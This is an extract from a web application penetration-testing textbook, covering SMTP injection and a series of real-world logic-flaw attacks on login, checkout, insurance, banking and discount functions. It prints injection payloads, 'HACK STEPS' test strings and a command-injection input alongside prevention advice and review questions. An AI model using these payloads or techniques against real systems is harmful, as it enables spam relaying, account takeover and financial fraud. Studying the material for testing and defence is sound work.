sends a single dot character on its own line. This tells the server that the message is complete, and the client can then issue further SMTP commands to 
send further messages.
In this situation, you may be able to inject arbitrary SMTP commands into 
any of the e-mail fi elds you control. For example, you can attempt to inject into 
the Subject fi eld as follows:
POST feedback.php HTTP/1.1
Host: wahh-app.com
Content-Length: 266
From=daf@wahh-mail.com&Subject=Site+feedback%0d%0afoo%0d%0a%2e%0d
%0aMAIL+FROM:+mail@wahh-viagra.com%0d%0aRCPT+TO:+john@wahh-mail
.com%0d%0aDATA%0d%0aFrom:+mail@wahh-viagra.com%0d%0aTo:+john@wahh-mail
.com%0d%0aSubject:+Cheap+V1AGR4%0d%0aBlah%0d%0a%2e%0d%0a&Message=foo
If the application is vulnerable, this results in the following SMTP conversation, which generates two different e-mail messages. The second is entirely 
within your control:
MAIL FROM: daf@wahh-mail.com
RCPT TO: feedback@wahh-app.com
DATA
From: daf@wahh-mail.com
To: feedback@wahh-app.com
Subject: Site+feedback
foo
.
MAIL FROM: mail@wahh-viagra.com
RCPT TO: john@wahh-mail.com
DATA
From: mail@wahh-viagra.com
To: john@wahh-mail.com
Subject: Cheap V1AGR4
Blah
.
foo
.
Finding SMTP Injection Flaws
To probe an application‚Äôs mail functionality effectively, you need to target every 
parameter that is submitted to an e-mail-related function, even those that may 
initially appear to be unrelated to the content of the generated message. You 
c10.indd 400 c10.indd 400 8/19/2011 12:10:50 PM 8/19/2011 12:10:50 PM
Stuttard c10.indd V2 - 07/05/2011 Page 401
 Chapter 10 n Attacking Back-End Components 401
should also test for each kind of attack, and you should perform each test case 
using both Windows- and UNIX-style newline characters.
HACK STEPS
 1. You should submit each of the following test strings as each parameter in 
turn, inserting your own e-mail address at the relevant position:
<youremail>%0aCc:<youremail>
<youremail>%0d%0aCc:<youremail>
<youremail>%0aBcc:<youremail>
<youremail>%0d%0aBcc:<youremail>
%0aDATA%0afoo%0a%2e%0aMAIL+FROM:+<youremail>%0aRCPT+TO:+<y
ouremail>%0aDATA%0aFrom:+<youremail>%0aTo:+<youremail>%0aS
ubject:+test%0afoo%0a%2e%0a
%0d%0aDATA%0d%0afoo%0d%0a%2e%0d%0aMAIL+FROM:+<youremail>%0
d%0aRCPT+TO:+<youremail>%0d%0aDATA%0d%0aFrom:+<youremail>%
0d%0aTo:+<youremail>%0d%0aSubject:+test%0d%0
afoo%0d%0a%2e%0d%0a
 2. Note any error messages the application returns. If these appear to relate 
to any problem in the e-mail function, investigate whether you need to 
fine-tune your input to exploit a vulnerability.
 3. The application‚Äôs responses may not indicate in any way whether a vulnerability exists or was successfully exploited. You should monitor the 
e-mail address you specified to see if any mail is received.
 4. Review closely the HTML form that generates the relevant request. This 
may contain clues about the server-side software being used. It may also 
contain a hidden or disabled field that specifies the e-mail‚Äôs To address, 
which you can modify directly.
TIP Functions to send e-mails to application support personnel are frequently regarded as peripheral and may not be subject to the same security 
standards or testing as the main application functionality. Also, because they 
involve interfacing to an unusual back-end component, they are often implemented via a direct call to the relevant operating system command. Hence, 
in addition to probing for SMTP injection, you should also closely review all 
e-mail-related functionality for OS command injection fl aws.
c10.indd 401 c10.indd 401 8/19/2011 12:10:50 PM 8/19/2011 12:10:50 PM
Stuttard c10.indd V2 - 07/05/2011 Page 402
402 Chapter 10 n Attacking Back-End Components
Preventing SMTP Injection
SMTP injection vulnerabilities usually can be prevented by implementing rigorous validation of any user-supplied data that is passed to an e-mail function 
or used in an SMTP conversation. Each item should be validated as strictly as 
possible given the purpose for which it is being used:
n E-mail addresses should be checked against a suitable regular expression 
(which should, of course, reject any newline characters).
n The message subject should not contain any newline characters, and it 
may be limited to a suitable length.
n If the contents of a message are being used directly in an SMTP conversation, lines containing just a single dot should be disallowed.
Summary
We have examined a wide range of attacks targeting back-end application 
components and the practical steps you can take to identify and exploit each 
one. Many real-world vulnerabilities can be discovered within the fi rst few 
seconds of interacting with an application. For example, you could enter some 
unexpected syntax into a search box. In other cases, these vulnerabilities may 
be highly subtle, manifesting themselves in scarcely detectable differences in 
the application‚Äôs behavior, or reachable only through a multistage process of 
submitting and manipulating crafted input.
To be confi dent that you have uncovered the back-end injection fl aws that 
exist within an application, you need to be both thorough and patient. Practically 
every type of vulnerability can manifest itself in the processing of practically 
any item of user-supplied data, including the names and values of query string 
parameters, POST data and cookies, and other HTTP headers. In many cases, a 
defect emerges only after extensive probing of the relevant parameter as you 
learn exactly what type of processing is being performed on your input and 
scrutinize the obstacles that stand in your way.
Faced with the huge potential attack surface presented by potential attacks 
against back-end application components, you may feel that any serious assault 
on an application must entail a titanic effort. However, part of learning the art 
of attacking software is to acquire a sixth sense for where the treasure is hidden and how your target is likely to open up so that you can steal it. The only 
way to gain this sense is through practice. You should rehearse the techniques 
we have described against the real-life applications you encounter and see how 
they stand up.
c10.indd 402 c10.indd 402 8/19/2011 12:10:50 PM 8/19/2011 12:10:50 PM
Stuttard c10.indd V2 - 07/05/2011 Page 403
 Chapter 10 n Attacking Back-End Components 403
Questions
Answers can be found at http://mdsec.net/wahh.
 1. A network device provides a web-based interface for performing device 
confi guration. Why is this kind of functionality often vulnerable to OS 
command injection attacks?
 2. You are testing the following URL:
http://wahh-app.com/home/statsmgr.aspx?country=US
Changing the value of the country parameter to foo results in this error 
message:
Could not open file: D:\app\default\home\logs\foo.log (invalid file). 
What steps could you take to attack the application?
 3. You are testing an AJAX application that sends data in XML format within 
POST requests. What kind of vulnerability might enable you to read 
arbitrary fi les from the server‚Äôs fi lesystem? What prerequisites must be 
in place for your attack to succeed?
 4. You make the following request to an application that is running on the 
ASP.NET platform:
POST /home.aspx?p=urlparam1&p=urlparam2 HTTP/1.1
Host: wahh-app.com
Cookie: p=cookieparam
Content-Type: application/x-www-form-urlencoded
Content-Length: 15
p=bodyparam
The application executes the following code:
String param = Request.Params[‚Äúp‚Äù];
What value does the param variable have?
 5. Is HPP a prerequisite for HPI, or vice versa?
 6. An application contains a function that proxies requests to external domains 
and returns the responses from those requests. To prevent server-side 
redirection attacks from retrieving protected resources on the application‚Äôs 
own web server, the application blocks requests targeting localhost or 
c10.indd 403 c10.indd 403 8/19/2011 12:10:50 PM 8/19/2011 12:10:50 PM
Stuttard c10.indd V2 - 07/05/2011 Page 404
404 Chapter 10 n Attacking Back-End Components
127.0.0.1. How might you circumvent this defense to access resources 
on the server?
 7. An application contains a function for user feedback. This allows the user 
to supply their e-mail address, a message subject, and detailed comments. 
The application sends an email to feedback@wahh-app.com, addressed 
from the user‚Äôs email address, with the user-supplied subject line and 
comments in the message body. Which of the following is a valid defense 
against mail injection attacks?
 (a) Disable mail relaying on the mail server.
 (b) Hardcode the RCPT TO fi eld with feedback@wahh-app.com.
 (c) Validate that the user-supplied inputs do not contain any newlines or 
other SMTP metacharacters.
c10.indd 404 c10.indd 404 8/19/2011 12:10:50 PM 8/19/2011 12:10:50 PM
Stuttard c11.indd V2 - 07/26/2011 Page 405
405
C H A P T E R 
11
Attacking Application Logic
All web applications employ logic to deliver their functionality. Writing code 
in a programming language involves at its root nothing more than breaking 
a complex process into simple and discrete logical steps. Translating a piece 
of functionality that is meaningful to human beings into a sequence of small 
operations that can be executed by a computer involves a great deal of skill and 
discretion. Doing so in an elegant and secure fashion is harder still. When large 
numbers of different designers and programmers work in parallel on the same 
application, there is ample opportunity for mistakes to occur.
In all but the simplest of web applications, a vast amount of logic is performed 
at every stage. This logic presents an intricate attack surface that is always 
present but often overlooked. Many code reviews and penetration tests focus 
exclusively on common ‚Äúheadline‚Äù vulnerabilities such as SQL injection and 
cross-site scripting, because these have an easily recognizable signature and 
well-researched exploitation vector. By contrast, fl aws in an application‚Äôs logic 
are harder to characterize: each instance may appear to be a unique one-off 
occurrence, and they usually are not identifi ed by any automated vulnerability 
scanners. As a result, they generally are not as well appreciated or understood, 
and therefore they are of great interest to an attacker.
This chapter describes the kinds of logic fl aws that often exist in web applications and the practical steps you can take to probe and attack an application‚Äôs 
logic. We will present a series of real-world examples, each of which manifests a 
different kind of logical defect. Together, they illustrate the variety of assumptions 
c11.indd 405 c11.indd 405 8/19/2011 12:11:44 PM 8/19/2011 12:11:44 PM
Stuttard c11.indd V2 - 07/26/2011 Page 406
406 Chapter 11 n Attacking Application Logic
that designers and developers make that can lead directly to faulty logic and 
expose an application to security vulnerabilities.
The Nature of Logic Flaws
Logic fl aws in web applications are extremely varied. They range from simple 
bugs manifested in a handful of lines of code, to complex vulnerabilities arising 
from the interoperation of several core components of the application. In some 
instances, they may be obvious and easy to detect; in other cases, they may be 
exceptionally subtle and liable to elude even the most rigorous code review or 
penetration test.
Unlike other coding fl aws such as SQL injection or cross-site scripting, no 
common ‚Äúsignature‚Äù is associated with logic fl aws. The defi ning characteristic, of 
course, is that the logic implemented within the application is defective in some 
way. In many cases, the defect can be represented in terms of a specifi c assumption 
that the designer or developer made, either explicitly or implicitly, that turns out 
to be fl awed. In general terms, a programmer may have reasoned something like 
‚ÄúIf A happens, then B must be the case, so I will do C.‚Äù The programmer did not 
ask the entirely different question ‚ÄúBut what if X occurs?‚Äù and therefore failed to 
consider a scenario that violates the assumption. Depending on the circumstances, 
this fl awed assumption may open a signifi cant security vulnerability.
As awareness of common web application vulnerabilities has increased in 
recent years, the incidence and severity of some categories of vulnerabilities have 
declined noticeably. However, because of the nature of logic fl aws, it is unlikely 
that they will ever be eliminated via standards for secure development, use of 
code-auditing tools, or normal penetration testing. The diverse nature of logic 
fl aws, and the fact that detecting and preventing them often requires a good 
measure of lateral thinking, suggests that they will be prevalent for a good 
while to come. Any serious attacker, therefore, needs to pay serious attention 
to the logic employed in the application being targeted to try to fi gure out the 
assumptions that designers and developers probably made. Then he should 
think imaginatively about how those assumptions may be violated.
Real-World Logic Flaws
The best way to learn about logic fl aws is not by theorizing, but by becoming 
acquainted with some actual examples. Although individual instances of logic 
fl aws differ hugely, they share many common themes, and they demonstrate 
the kinds of mistakes that human developers will always be prone to making. 
c11.indd 406 c11.indd 406 8/19/2011 12:11:44 PM 8/19/2011 12:11:44 PM
06 Stuttard c11.indd V2 - 07/26/2011 Page 407
 Chapter 11 n Attacking Application Logic 407
Hence, insights gathered from studying a sample of logic fl aws should help you 
uncover new fl aws in entirely different situations.
Example 1: Asking the Oracle
The authors have found instances of the ‚Äúencryption oracle‚Äù fl aw within many 
different types of applications. They have used it in numerous attacks, from 
decrypting domain credentials in printing software to breaking cloud computing. The following is a classic example of the fl aw found in a software sales site.
The Functionality
The application implemented a ‚Äúremember me‚Äù function whereby a user could 
avoid logging in to the application on each visit by allowing the application to 
set a permanent cookie within the browser. This cookie was protected from 
tampering or disclosure by an encryption algorithm that was run over a string 
composed of the name, user ID, and volatile data to ensure that the resultant 
value was unique and could not be predicted. To ensure that it could not be 
replayed by an attacker who gained access to it, data specifi c to the machine 
was also collected, including the IP address.
This cookie was justifi ably considered a robust solution for protecting a 
potentially vulnerable piece of required business functionality.
As well as a ‚Äúremember me‚Äù function, the application had functionality to 
store the user‚Äôs screen name within a cookie named ScreenName. That way, the 
user could receive a personalized greeting in the corner of the site whenever 
she next visited the site. Deciding that this name was also a piece of security 
information, it was deemed that this should also be encrypted.
The Assumption
The developers decided that because the ScreenName cookie was of considerably 
less value to an attacker than the RememberMe cookie, they may as well use the 
same encryption algorithm to protect it. What they did not consider was that a 
user can specify his screen name and view it onscreen. This inadvertently gave 
users access to the encryption function (and encryption key) used to protect the 
persistent authentication token RememberMe.
The Attack
In a simple attack, a user supplied the encrypted value of his or her RememberMe
cookie in place of the encrypted ScreenName cookie. When displaying the screen 
name back to the user, the application would decrypt the value, check that 
c11.indd 407 c11.indd 407 8/19/2011 12:11:44 PM 8/19/2011 12:11:44 PM
Stuttard c11.indd V2 - 07/26/2011 Page 408
408 Chapter 11 n Attacking Application Logic
decryption had worked, and then print the result on-screen. This resulted in 
the following message:
Welcome, marcus|734|192.168.4.282750184
Although this was interesting, it was not necessarily a high-risk issue. It 
simply meant that given an encrypted RememberMe cookie, an attacker could 
list the contents, including a username, user ID, and IP address. Because no 
password was stored in the cookie, there was no immediate way to act on the 
information obtained.
The real issue arose from the fact that users could specify their screen names. 
As a result, a user could choose this screen name, for example:
admin|1|192.168.4.282750184
When the user logged out and logged back in, the application encrypted this 
value and stored it in the user‚Äôs browser as the encrypted ScreenName cookie. 
If an attacker submitted this encrypted token as the value of the RememberMe
cookie, the application decrypted it, read the user ID, and logged in the attacker 
as the administrator! Even though the encryption was Triple DES, using a strong 
key and protected against replay attacks, the application could be harnessed as 
an ‚Äúencryption oracle‚Äù to decrypt and encrypt arbitrary values.
HACK STEPS
Manifestations of this type of vulnerability can be found in diverse locations. 
Examples include account recovery tokens, token-based access to authenticated resources, and any other value being sent to the client side that needs 
to be either tamper-proof or unreadable to the user.
 1. Look for locations where encryption (not hashing) is used in the application. Determine any locations where the application encrypts or decrypts 
values supplied by a user, and attempt to substitute any other encrypted 
values encountered within the application. Try to cause an error within 
the application that reveals the decrypted value or where the decrypted 
value is purposely displayed on-screen.
 2. Look for an ‚Äúoracle reveal‚Äù vulnerability by determining where an 
encrypted value can be supplied that results in the corresponding decrypted value‚Äôs being displayed in the application‚Äôs response. 
Determine whether this leads to the disclosure of sensitive information, 
such as a password or credit card.
 3. Look for an ‚Äúoracle encrypt‚Äù vulnerability by determining where supplying a cleartext value causes the application to return a corresponding 
encrypted value. Determine where this can be abused by specifying arbitrary values, or malicious payloads that the application will process.
c11.indd 408 c11.indd 408 8/19/2011 12:11:44 PM 8/19/2011 12:11:44 PM
08 Stuttard c11.indd V2 - 07/26/2011 Page 409
 Chapter 11 n Attacking Application Logic 409
Example 2: Fooling a Password Change Function
The authors have encountered this logic fl aw in a web application implemented 
by a fi nancial services company and also in the AOL AIM Enterprise Gateway 
application.
The Functionality
The application implemented a password change function for end users. It 
required the user to fi ll out fi elds for username, existing password, new password, and confi rm new password.
There was also a password change function for use by administrators. This 
allowed them to change the password of any user without supplying the existing 
password. The two functions were implemented within the same server-side 
script.
The Assumption
The client-side interface presented to users and administrators differed in one 
respect: the administrator‚Äôs interface did not contain a fi eld for the existing 
password. When the server-side application processed a password change 
request, it used the presence or absence of the existing password parameter to 
indicate whether the request was from an administrator or an ordinary user. In 
other words, it assumed that ordinary users would always supply an existing 
password parameter.
The code responsible looked something like this:
String existingPassword = request.getParameter(‚ÄúexistingPassword‚Äù);
if (null == existingPassword)
{
 trace(‚ÄúOld password not supplied, must be an administrator‚Äù);
 return true;
}
else
{
 trace(‚ÄúVerifying user‚Äôs old password‚Äù);
 ...
The Attack
When the assumption is explicitly stated in this way, the logic fl aw becomes 
obvious. Of course, an ordinary user could issue a request that did not contain 
an existing password parameter, because users controlled every aspect of the 
requests they issued.
c11.indd 409 c11.indd 409 8/19/2011 12:11:45 PM 8/19/2011 12:11:45 PM
Stuttard c11.indd V2 - 07/26/2011 Page 410
410 Chapter 11 n Attacking Application Logic
This logic fl aw was devastating for the application. It enabled an attacker to 
reset the password of any other user and take full control of that person‚Äôs account.
HACK STEPS
 1. When probing key functionality for logic flaws, try removing in turn each 
parameter submitted in requests, including cookies, query string fields, 
and items of POST data.
 2. Be sure to delete the actual name of the parameter as well as its value. 
Do not just submit an empty string, because typically the server handles 
this differently.
 3. Attack only one parameter at a time to ensure that all relevant code paths 
within the application are reached.
 4. If the request you are manipulating is part of a multistage process, follow 
the process through to completion, because some later logic may process 
data that was supplied in earlier steps and stored within the session.
Example 3: Proceeding to Checkout
The authors encountered this logic fl aw in the web application employed by 
an online retailer.
The Functionality
The process of placing an order involved the following stages:
 1. Browse the product catalog, and add items to the shopping basket.
 2. Return to the shopping basket, and fi nalize the order.
 3. Enter payment information.
 4. Enter delivery information.
The Assumption
The developers assumed that users would always access the stages in the intended 
sequence, because this was the order in which the stages are delivered to the 
user by the navigational links and forms presented to the user‚Äôs browser. Hence, 
any user who completed the ordering process must have submitted satisfactory 
payment details along the way.
The Attack
The developers‚Äô assumption was fl awed for fairly obvious reasons. Users controlled every request they made to the application and therefore could access 
c11.indd 410 c11.indd 410 8/19/2011 12:11:45 PM 8/19/2011 12:11:45 PM
10 Stuttard c11.indd V2 - 07/26/2011 Page 411
 Chapter 11 n Attacking Application Logic 411
any stage of the ordering process in any sequence. By proceeding directly from 
stage 2 to stage 4, an attacker could generate an order that was fi nalized for 
delivery but that had not actually been paid for.
HACK STEPS
The technique for fi nding and exploiting fl aws of this kind is known as forced 
browsing. It involves circumventing any controls imposed by in-browser navigation on the sequence in which application functions may be accessed:
 1. When a multistage process involves a defined sequence of requests, 
attempt to submit these requests out of the expected sequence. Try skipping certain stages, accessing a single stage more than once, and accessing earlier stages after later ones.
 2. The sequence of stages may be accessed via a series of GET or POST
requests for distinct URLs, or they may involve submitting different sets of 
parameters to the same URL. The stage being requested may be specified 
by submitting a function name or index within a request parameter. Be 
sure to understand fully the mechanisms that the application is employing 
to deliver access to distinct stages.
 3. From the context of the functionality that is implemented, try to understand what assumptions the developers may have made and where the 
key attack surface lies. Try to identify ways of violating those assumptions 
to cause undesirable behavior within the application.
 4. When multistage functions are accessed out of sequence, it is common 
to encounter a variety of anomalous conditions within the application, 
such as variables with null or uninitialized values, a partially defined or 
inconsistent state, and other unpredictable behavior. In this situation, the 
application may return an interesting error message and debug output, 
which you can use to better understand its internal workings and thereby 
fine-tune the current or a different attack (see Chapter 15). Sometimes, 
the application may get into a state entirely unanticipated by developers, 
which may lead to serious security flaws.
NOTE Many types of access control vulnerability are similar in nature to this 
logic fl aw. When a privileged function involves multiple stages that normally 
are accessed in a defi ned sequence, the application may assume that users 
will always proceed through the functionality in this sequence. The application may enforce strict access control on the initial stages of the process and 
assume that any user who reaches the later stages therefore must be authorized. If a low-privileged user proceeds directly to a later stage, she may be 
able to access it without any restrictions. See Chapter 8 for more details on 
fi nding and exploiting vulnerabilities of this kind.
c11.indd 411 c11.indd 411 8/19/2011 12:11:45 PM 8/19/2011 12:11:45 PM
Stuttard c11.indd V2 - 07/26/2011 Page 412
412 Chapter 11 n Attacking Application Logic
Example 4: Rolling Your Own Insurance
The authors encountered this logic fl aw in a web application deployed by a 
fi nancial services company.
The Functionality
The application enabled users to obtain quotes for insurance and, if desired, 
complete and submit an insurance application online. The process was spread 
across a dozen stages:
n At the fi rst stage, the applicant submitted some basic information and 
specifi ed either a preferred monthly premium or the value he wanted 
insurance for. The application offered a quote, computing whichever 
value the applicant did not specify.
n Across several stages, the applicant supplied various other personal details, 
including health, occupation, and pastimes.
n Finally, the application was transmitted to an underwriter working for 
the insurance company. Using the same web application, the underwriter 
reviewed the details and decided whether to accept the application as is 
or modify the initial quote to refl ect any additional risks.
Through each of the stages described, the application employed a shared component to process each parameter of user data submitted to it. This component 
parsed all the data in each POST request into name/value pairs and updated its 
state information with each item of data received.
The Assumption
The component that processed user-supplied data assumed that each request 
would contain only the parameters that had been requested from the user in 
the relevant HTML form. Developers did not consider what would happen if a 
user submitted parameters he was not asked to supply.
The Attack
Of course, the assumption was fl awed, because users could submit arbitrary 
parameter names and values with every request. As a result, the application‚Äôs 
core functionality was broken in various ways:
n An attacker could exploit the shared component to bypass all server-side 
input validation. At each stage of the quotation process, the application 
performed strict validation of the data expected at that stage and rejected 
any data that failed this validation. But the shared component updated 
c11.indd 412 c11.indd 412 8/19/2011 12:11:45 PM 8/19/2011 12:11:45 PM
12 Stuttard c11.indd V2 - 07/26/2011 Page 413
 Chapter 11 n Attacking Application Logic 413
the application‚Äôs state with every parameter supplied by the user. Hence, 
if an attacker submitted data out of sequence by supplying a name/value 
pair that the application expected at an earlier stage, that data would be 
accepted and processed, with no validation having been performed. As it 
happened, this possibility paved the way for a stored cross-site scripting 
attack targeting the underwriter, which allowed a malicious user to access 
the personal information of other applicants (see Chapter 12).
n An attacker could buy insurance at an arbitrary price. At the fi rst stage of 
the quotation process, the applicant specifi ed either her preferred monthly 
premium or the value she wanted to insure, and the application computed 
the other item accordingly. However, if a user supplied new values for 
either or both of these items at a later stage, the application‚Äôs state was 
updated with these values. By submitting these parameters out of sequence, 
an attacker could obtain a quote for insurance at an arbitrary value and 
arbitrary monthly premium.
n There were no access controls regarding which parameters a given type of 
user could supply. When an underwriter reviewed a completed application, he updated various items of data, including the acceptance decision. 
This data was processed by the shared component in the same way as 
data supplied by an ordinary user. If an attacker knew or guessed the 
parameter names used when the underwriter reviewed an application, the 
attacker could simply submit these, thereby accepting his own application 
without any actual underwriting.
HACK STEPS
The fl aws in this application were fundamental to its security, but none of 
them would have been identifi ed by an attacker who simply intercepted 
browser requests and modifi ed the parameter values being submitted.
 1. Whenever an application implements a key action across multiple stages, 
you should take parameters that are submitted at one stage of the process and try submitting these to a different stage. If the relevant items of 
data are updated within the application‚Äôs state, you should explore the 
ramifications of this behavior to determine whether you can leverage it to 
carry out any malicious action, as in the preceding three examples.
 2. If the application implements functionality whereby different categories 
of user can update or perform other actions on a common collection 
of data, you should walk through the process using each type of user 
and observe the parameters submitted. Where different parameters are 
ordinarily submitted by the different users, take each parameter submitted by one user and try to submit it as the other user. If the parameter 
is accepted and processed as that user, explore the implications of this 
behavior as previously described.
c11.indd 413 c11.indd 413 8/19/2011 12:11:45 PM 8/19/2011 12:11:45 PM
Stuttard c11.indd V2 - 07/26/2011 Page 414
414 Chapter 11 n Attacking Application Logic
Example 5: Breaking the Bank
The authors encountered this logic fl aw in the web application deployed by a 
major fi nancial services company.
The Functionality
The application enabled existing customers who did not already use the online 
application to register to do so. New users were required to supply some basic 
personal information to provide a degree of assurance of their identity. This 
information included name, address, and date of birth, but it did not include 
anything secret such as an existing password or PIN.
When this information had been entered correctly, the application forwarded 
the registration request to back-end systems for processing. An information pack 
was mailed to the user‚Äôs registered home address. This pack included instructions 
for activating her online access via a telephone call to the company‚Äôs call center 
and also a one-time password to use when fi rst logging in to the application.
The Assumption
The application‚Äôs designers believed that this mechanism provided a robust 
defense against unauthorized access to the application. The mechanism implemented three layers of protection:
n A modest amount of personal data was required up front to deter a malicious attacker or mischievous user from attempting to initiate the registration process on other users‚Äô behalf.
n The process involved transmitting a key secret out-of-band to the customer‚Äôs registered home address. An attacker would need to have access 
to the victim‚Äôs personal mail.
n The customer was required to telephone the call center and authenticate 
himself there in the usual way, based on personal information and selected 
digits from a PIN.
This design was indeed robust. The logic fl aw lay in the implementation of 
the mechanism.
The developers implementing the registration mechanism needed a way to 
store the personal data submitted by the user and correlate this with a unique 
customer identity within the company‚Äôs database. Keen to reuse existing code, 
they came across the following class, which appeared to serve their purposes:
class CCustomer
{
 String firstName;
 String lastName;
c11.indd 414 c11.indd 414 8/19/2011 12:11:45 PM 8/19/2011 12:11:45 PM
14 Stuttard c11.indd V2 - 07/26/2011 Page 415
 Chapter 11 n Attacking Application Logic 415
 CDoB dob;
 CAddress homeAddress;
 long custNumber;
 ...
After the user‚Äôs information was captured, this object was instantiated, populated with the supplied information, and stored in the user‚Äôs session. The application then verifi ed the user‚Äôs details and, if they were valid, retrieved that user‚Äôs 
unique customer number, which was used in all the company‚Äôs systems. This 
number was added to the object, together with some other useful information 
about the user. The object was then transmitted to the relevant back-end system 
for the registration request to be processed.
The developers assumed that using this code component was harmless and 
would not lead to a security problem. However, the assumption was fl awed, 
with serious consequences.
The Attack
The same code component that was incorporated into the registration functionality was also used elsewhere within the application, including within the core 
functionality. This gave authenticated users access to account details, statements, 
funds transfers, and other information. When a registered user successfully 
authenticated herself to the application, this same object was instantiated and 
saved in her session to store key information about her identity. The majority 
of the functionality within the application referenced the information within 
this object to carry out its actions. For example, the account details presented to 
the user on her main page were generated on the basis of the unique customer 
number contained within this object.
The way in which the code component was already being employed within 
the application meant that the developers‚Äô assumption was fl awed, and the 
manner in which they reused it did indeed open a signifi cant vulnerability.
Although the vulnerability was serious, it was in fact relatively subtle to 
detect and exploit. Access to the main application functionality was protected by 
access controls at several layers, and a user needed to have a fully authenticated 
session to pass these controls. To exploit the logic fl aw, therefore, an attacker 
needed to follow these steps:
n Log in to the application using his own valid account credentials.
n Using the resulting authenticated session, access the registration functionality and submit a different customer‚Äôs personal information. This caused 
the application to overwrite the original CCustomer object in the attacker‚Äôs 
session with a new object relating to the targeted customer.
n Return to the main application functionality and access the other customer‚Äôs account.
c11.indd 415 c11.indd 415 8/19/2011 12:11:45 PM 8/19/2011 12:11:45 PM
Stuttard c11.indd V2 - 07/26/2011 Page 416
416 Chapter 11 n Attacking Application Logic
A vulnerability of this kind is not easy to detect when probing the application from a black-box perspective. However, it is also hard to identify when 
reviewing or writing the actual source code. Without a clear understanding of 
the application as a whole and how different components are used in different 
areas, the fl awed assumption made by developers may not be evident. Of course, 
clearly commented source code and design documentation would reduce the 
likelihood of such a defect‚Äôs being introduced or remaining undetected.
HACK STEPS
 1. In a complex application involving either horizontal or vertical privilege 
segregation, try to locate any instances where an individual user can accumulate an amount of state within his session that relates in some way to 
his identity.
 2. Try to step through one area of functionality, and then switch to an unrelated area, to determine whether any accumulated state information has 
an effect on the application‚Äôs behavior.
Example 6: Beating a Business Limit
The authors encountered this logic fl aw in a web-based enterprise resource 
planning application used within a manufacturing company.
The Functionality
Finance personnel could perform funds transfers between various bank accounts 
owned by the company and its key customers and suppliers. As a precaution 
against fraud, the application prevented most users from processing transfers 
with a value greater than $10,000. Any transfer larger than this required a senior 
manager‚Äôs approval.
The Assumption
The code responsible for implementing this check within the application was 
simple:
bool CAuthCheck::RequiresApproval(int amount)
{
 if (amount <= m_apprThreshold)
 return false;
 else return true;
}
c11.indd 416 c11.indd 416 8/19/2011 12:11:45 PM 8/19/2011 12:11:45 PM
16 Stuttard c11.indd V2 - 07/26/2011 Page 417
 Chapter 11 n Attacking Application Logic 417
The developers assumed that this transparent check was bulletproof. No 
transaction for greater than the confi gured threshold could ever escape the 
requirement for secondary approval.
The Attack
The developers‚Äô assumption was fl awed because they overlooked the possibility 
that a user would attempt to process a transfer for a negative amount. Any negative number would clear the approval test, because it is less than the threshold. 
However, the banking module of the application accepted negative transfers and 
simply processed them as positive transfers in the opposite direction. Hence, 
any user who wanted to transfer $20,000 from account A to account B could 
simply initiate a transfer of ‚Äì$20,000 from account B to account A, which had 
the same effect and required no approval. The antifraud defenses built into the 
application could be bypassed easily!
NOTE Many kinds of web applications employ numeric limits within their 
business logic:
n A retailing application may prevent a user from ordering more than the 
number of units available in stock.
n A banking application may prevent a user from making bill payments 
that exceed her current account balance.
n An insurance application may adjust its quotes based on age thresholds.
Finding a way to beat such limits often does not represent a security compromise of the application itself. However, it may have serious business consequences and represent a breach of the controls that the owner is relying on 
the application to enforce.
The most obvious vulnerabilities of this kind often are detected during 
the user-acceptance testing that normally occurs before an application is 
launched. However, more subtle manifestations of the problem may remain, 
particularly when hidden parameters are being manipulated.
HACK STEPS
The fi rst step in attempting to beat a business limit is to understand what 
characters are accepted within the relevant input that you control.
 1. Try entering negative values, and see if the application accepts them and 
processes them in the way you would expect.
 2. You may need to perform several steps to engineer a change in the application‚Äôs state that can be exploited for a useful purpose. For example, 
several transfers between accounts may be required until a suitable balance has been accrued that can actually be extracted.
c11.indd 417 c11.indd 417 8/19/2011 12:11:45 PM 8/19/2011 12:11:45 PM
Stuttard c11.indd V2 - 07/26/2011 Page 418
418 Chapter 11 n Attacking Application Logic
Example 7: Cheating on Bulk Discounts
The authors encountered this logic fl aw in the retail application of a software 
vendor.
The Functionality
The application allowed users to order software products and qualify for bulk 
discounts if a suitable bundle of items was purchased. For example, users who 
purchased an antivirus solution, personal fi rewall, and antispam software were 
entitled to a 25% discount on the individual prices.
The Assumption
When a user added an item of software to his shopping basket, the application 
used various rules to determine whether the bundle of purchases he had chosen 
entitled him to a discount. If so, the prices of the relevant items within the shopping basket were adjusted in line with the discount. The developers assumed 
that the user would go on to purchase the chosen bundle and therefore would 
be entitled to the discount.
The Attack
The developers‚Äô assumption is rather obviously fl awed because it ignores the 
fact that users may remove items from their shopping baskets after they have 
been added. A crafty user could add to his basket large quantities of every 
single product on sale from the vendor to attract the maximum possible bulk 
discounts. After the discounts were applied to items in his shopping basket, he 
could remove items he did not want and still receive the discounts applied to 
the remaining products.
HACK STEPS
 1. In any situation where prices or other sensitive values are adjusted based 
on criteria that are determined by user-controllable data or actions, first 
understand the algorithms that the application uses and the point within 
its logic where adjustments are made. Identify whether these adjustments 
are made on a one-time basis or whether they are revised in response to 
further actions performed by the user.
 2. Think imaginatively. Try to find a way of manipulating the application‚Äôs 
behavior to cause it to get into a state where the adjustments it has 
applied do not correspond to the original criteria intended by its designers. In the most obvious case, as just described, this may simply involve 
removing items from a shopping cart after a discount has been applied!
c11.indd 418 c11.indd 418 8/19/2011 12:11:45 PM 8/19/2011 12:11:45 PM
18 Stuttard c11.indd V2 - 07/26/2011 Page 419
 Chapter 11 n Attacking Application Logic 419
Example 8: Escaping from Escaping
The authors encountered this logic fl aw in various web applications, including 
the web administration interface used by a network intrusion detection product.
The Functionality
The application‚Äôs designers had decided to implement some functionality that 
involved passing user-controllable input as an argument to an operating system 
command. The application‚Äôs developers understood the inherent risks involved 
in this kind of operation (see Chapter 9) and decided to defend against these 
risks by sanitizing any potentially malicious characters within the user input. 
Any instances of the following would be escaped using the backslash character:
;|&<>‚Äò space and newline
Escaping data in this way causes the shell command interpreter to treat the 
relevant characters as part of the argument being passed to the invoked command, rather than as shell metacharacters. Such metacharacters could be used 
to inject additional commands or arguments, redirect output, and so on.
The Assumption
The developers were certain that they had devised a robust defense against 
command injection attacks. They had brainstormed every possible character that 
might assist an attacker and had ensured that they were all properly escaped 
and therefore made safe.
The Attack
The developers forgot to escape the escape character itself.
The backslash character usually is not of direct use to an attacker when 
exploiting a simple command injection fl aw. Therefore, the developers did not 
identify it as potentially malicious. However, by failing to escape it, they provided a means for the attacker to defeat their sanitizing mechanism.
Suppose an attacker supplies the following input to the vulnerable function:
foo\;ls
